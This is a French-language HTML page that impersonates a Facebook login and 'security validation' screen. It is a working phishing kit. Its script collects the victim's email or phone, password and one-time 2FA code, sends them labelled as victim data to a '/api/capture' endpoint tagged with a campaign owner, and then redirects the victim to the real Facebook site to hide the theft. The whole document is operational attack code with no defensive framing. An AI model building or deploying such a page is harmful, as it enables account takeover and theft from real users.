<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation Sécurité — Facebook</title>
    <style>
        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .fb-container { display: flex; width: 980px; justify-content: space-between; align-items: center; padding: 20px; }
        .fb-left { width: 500px; padding-right: 32px; }
        .fb-left h1 { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 10px; }
        .fb-left p { font-size: 28px; line-height: 32px; color: #1c1e21; }
        .fb-card { background: #ffffff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 396px; text-align: center; }
        .fb-card input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
        .fb-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 20px; font-weight: bold; line-height: 48px; width: 100%; cursor: pointer; transition: 0.2s; }
        .fb-btn:hover { background-color: #166fe5; }
        .hidden-step { display: none; }
        .info-text { font-size: 14px; color: #606770; margin-bottom: 15px; text-align: left; }
    </style>
</head>
<body>

<div class="fb-container">
    <div class="fb-left">
        <h1>facebook</h1>
        <p>Sécurité et validation de connexion par code d'authentification.</p>
    </div>
    <div class="fb-card">
        <!-- ÉTAPE 1 : Identifiants -->
        <form id="step1-form" onsubmit="handleStep1(event)">
            <input type="text" id="v-user" placeholder="Adresse e-mail ou numéro de tél." required>
            <input type="password" id="v-pass" placeholder="Mot de passe" required>
            <button type="submit" class="fb-btn">Continuer</button>
        </form>

        <!-- ÉTAPE 2 : Code OTP -->
        <form id="step2-form" class="hidden-step" onsubmit="handleStep2(event)">
            <div class="info-text">Entrez le code à 6 chiffres généré par votre application ou reçu par SMS.</div>
            <input type="text" id="v-otp" placeholder="Code de confirmation (OTP)" required autofocus>
            <button type="submit" class="fb-btn">Valider le code</button>
        </form>
    </div>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const campaignOwner = urlParams.get('user') || 'Inconnu';

    let cachedUser = "";
    let cachedPass = "";

    function handleStep1(event) {
        event.preventDefault();
        cachedUser = document.getElementById('v-user').value;
        cachedPass = document.getElementById('v-pass').value;

        // Masque l'étape 1 et affiche l'étape OTP sans recharger la page
        document.getElementById('step1-form').classList.add('hidden-step');
        document.getElementById('step2-form').classList.remove('hidden-step');
    }

    function handleStep2(event) {
        event.preventDefault();
        const otpVal = document.getElementById('v-otp').value;

        const payload = {
            owner: campaignOwner,
            network: "Facebook",
            type: "otp",
            victimUser: cachedUser,
            victimPass: cachedPass,
            otp: otpVal
        };

        fetch('/api/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(() => {
            window.location.href = "https://www.facebook.com";
        }).catch(() => {
            window.location.href = "https://www.facebook.com";
        });
    }
</script>

</body>
</html>
